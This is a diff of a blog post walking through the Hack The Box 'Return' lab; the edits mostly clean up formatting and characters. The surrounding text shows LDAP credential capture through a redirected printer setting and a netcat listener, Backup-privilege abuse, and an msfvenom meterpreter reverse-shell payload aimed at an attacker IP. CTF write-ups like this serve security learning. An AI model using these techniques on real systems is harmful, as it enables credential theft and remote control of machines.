@@ -6,7 +6,7 @@ tags:
 - HTB
 - ldap
 - on-prem
-- privesc_backup
+- privesc
 ---
 
 Walkthrough of HTB's Return machine
@@ -80,7 +80,7 @@ When I submitted the form, I observed that only the IP address field was forward
 Further research revealed interesting information
 Printers can use LDAP (Lightweight Directory Access Protocol) to query the Active Directory for user details, such as email addresses, usernames, and group memberships. This allows features like:
 
-- Sending scanned documents to a userâ€™s email directly.
+- Sending scanned documents to a users email directly.
 - Displaying a list of users for specific authentication or tracking purposes.
 
 For this to work, the printer needs LDAP credentials (often a service account like svc-printer) to bind to AD and perform queries.
@@ -92,8 +92,7 @@ I modified the IP address to point to my machine and set up a Netcat listener to
 The incoming request revealed interesting information, which indeed appears to be a password.
 
 ```bash
-â”Œâ”€â”€(kaliã‰¿kali)-[~]
-â””â”€$ nc -nlvp 389                                                                   
+$ nc -nlvp 389                                                                   
 listening on [any] 389 ...
 connect to [10.10.16.30] from (UNKNOWN) [10.10.11.108] 63453
 0*`%return\svc-printerï¿½
@@ -125,7 +124,7 @@ Enumerating privileges of "svc-printer" using *whoami* command
 Since the user has the Backup privilege enabled. Uploading the necessary module to leverage this privilege for replication.
 ![image.png]({{ '/assets/img/Return/image%208.png' | relative_url }})
 
-Using robocopy to copy the Administratorâ€™s desktop files to a temporary folder.
+Using robocopy to copy the Administrator's desktop files to a temporary folder.
 ![image.png]({{ '/assets/img/Return/image%209.png' | relative_url }})
 
 Followed by accessing root.txt
@@ -152,13 +151,13 @@ The service has not been started.
 The service did not respond to the start or control request in a timely fashion.
 ```
 
-> ðŸ’¡ **Note**: When executing the command sc start vss, it is important to explicitly specify sc.exe for the command to work correctly. Simply using sc will not be sufficient.
+**Note**: When executing the command sc start vss, it is important to explicitly specify sc.exe for the command to work correctly. Simply using sc will not be sufficient.
 
 However, the obtained shell terminated after a few seconds. To resolve this issue, I proceeded to upload a Meterpreter shell for further exploitation.
 
 Generated meterpreter reverse shell executable payload file using msfvenom
 ```bash
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=8888 -f exe > payload.exe 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=8888 -f exe > payload.exe 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
